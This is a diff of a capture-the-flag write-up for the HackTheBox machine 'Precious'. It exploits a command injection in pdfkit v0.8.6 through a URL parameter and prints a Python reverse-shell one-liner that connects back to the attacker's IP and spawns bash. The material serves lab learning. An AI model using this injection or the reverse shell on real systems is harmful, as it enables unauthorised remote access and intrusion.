@@ -62,7 +62,7 @@ It is a website to convert Websites to PDF. We can do some basic tests to get mo
 python -m http.server 80
 ```
 
-This is a really simple Webserver, but it is enough for us. We can enter our URL **(http://10.10.14.144/)** to our Webserver and see what happens:
+This is a really simple Webserver, but it is enough for us. We can enter our URL **(http://10.10.14.144/)** to the field on the Website and see what happens:
 
 ![pdf Download](Assets/HTB-Linux-Easy-Precious/pdfDownload.png)
 
@@ -72,7 +72,7 @@ We can see that the Website download a PDF file. Visually, it is just a simples 
 
 # Exploit - Remote Code Execution
 
-We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we got a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it is simple! We just need to add to the URL a param called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a *bash* code (because is a Linux Machine) with the special symbol **`** around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine. The final URL will be:
+We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version is vulnerable and we can get a RCE (Remote Code Execution). We can see more about this vulnerability [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). To exploit this vulnerability, it is simple! We just need to add to the URL a param called **?user** and give a "space" but encoded (a space like %20 is the URL code for a space of the space bar). Next, we need to concatenate a *bash* code (because is a Linux Machine) with the special symbol **`** (a code between 2 of this symbol in bash get execute before the rest of the command outside the symbols) around the code for execute it like if we are in a command line shell. The command we will try is a single ping to our machine to test if we really got remote code execution. The final URL will be:
 
 > http://10.10.14.144/?name=%20`ping -c 1 10.10.14.144`
 ```bash
@@ -90,11 +90,10 @@ while True:
     data = {
         'url': f"http://10.10.14.144/?name=%20`{cmd}`",
         }
-
     response = requests.post('http://precious.htb/', data=data, verify=False)
 ```
 
-Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell in the target machine. But the way we got this is tricky. We need to find a way to the target machine send is own shell to our machine. Is like we try to enter in a house, and we need to find a way that the house open his own door to give us the access... The command worked on the machine was this:
+Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell in the target machine. But the way we got this is tricky. We need to find a way to the target machine send his own shell to our machine. Is like we try to enter in a house, and we need to find a way that the house open his own door to give us the access... The command worked on the machine was this:
 
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
@@ -106,13 +105,13 @@ So, if we want to do that on the Website, we need to send this url:
 http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 ```
 
-The query needs to be that exact and we need to adapt the IP and the port, and we need to setup a listener to capture the shell.
+The query needs to be that exact and we need to adapt the IP and the port. We need to setup a listener to capture the shell too.
 
 ![Reverse Shell](Assets/HTB-Linux-Easy-Precious/ReverseShell.png)
 
 # Foothold
 
-We are in the machine. But we have low privilege. We need more!! HUAAHAHA
+We are in the machine. But we have low privilege. We need more!! HUAAHAHA!!
 
 Digging through the folders and files, we'll find credentials for a service used by the user henry.
 
